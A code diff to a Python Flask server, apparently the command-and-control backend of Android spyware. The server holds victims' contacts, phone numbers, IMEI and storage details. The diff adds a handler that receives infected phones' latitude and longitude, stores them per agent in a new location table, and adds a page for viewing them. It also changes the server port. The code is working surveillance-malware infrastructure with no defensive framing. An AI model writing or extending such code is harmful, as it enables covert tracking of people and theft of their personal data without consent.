@@ -77,6 +77,12 @@ def viewPhoneDetails():
     storage_d_columns=storage_d_columns, storage_d_data_rows=storage_d_data_rows,
     telephony_d_columns=telephony_d_columns, telephony_d_data_rows=telephony_d_data_rows,
     )
+    
+@app.route("/location")
+def viewLocation():
+    sql = "SELECT * FROM location"
+    data_rows, columns = get_data_sql(sql)
+    return render_template("location.html", title="location", columns=columns, data=data_rows)
 
 #############
 # C2 Routes #
@@ -145,6 +151,8 @@ def receiveResult(id):
             return handle_contacts(content["data"], id)
         elif code == "phonedetails":
             return handle_phonedetails(content["data"], id)
+        elif code == "location":
+            return handle_location(content["data"], id)
         
     else:
         return ("\n", 204)
@@ -260,6 +268,18 @@ def handle_phonedetails(content, id):
     
     return ("Success", 200)
     
+def handle_location(content, id):
+    print(f"Received location data: {content}\n\n")
+    clearAgentTasks(id)
+    for json_data in content:
+        latitude = json_data.get("latitude", "")
+        longitude = json_data.get("longitude", "")
+
+        # Save data to database
+        sql = "INSERT INTO location VALUES (?, ?, ?)"
+        args = (id, latitude, longitude)
+        writeToDatabase(sql, args)
+
 
 ####################
 # Helper functions #
@@ -334,7 +354,9 @@ def init_database():
             
             "CREATE TABLE IF NOT EXISTS storagedetails(id TEXT, totalExternalStorage TEXT, availableExternalStorage TEXT, totalInternalStorage TEXT, availableInternalStorage TEXT, storagePath TEXT, totalSpace TEXT, availableSpace TEXT)",
             
-            "CREATE TABLE IF NOT EXISTS telephonydetails(id TEXT, phoneNumber TEXT, imei TEXT)"
+            "CREATE TABLE IF NOT EXISTS telephonydetails(id TEXT, phoneNumber TEXT, imei TEXT)",
+            
+            "CREATE TABLE IF NOT EXISTS location(id TEXT, latitude TEXT, longitude TEXT)"
         ]
 
         for sql in sqls:
@@ -352,7 +374,7 @@ def run_server():
     import logging
     logging.basicConfig(filename='log',level=logging.DEBUG)
 
-    app.run(host='0.0.0.0', port=443, ssl_context=('keys/cert.pem', 'keys/key2.pem'))
+    app.run(host='0.0.0.0', port=5000, ssl_context=('keys/cert.pem', 'keys/key2.pem'))
 
 if __name__ == "__main__":
     run_server()
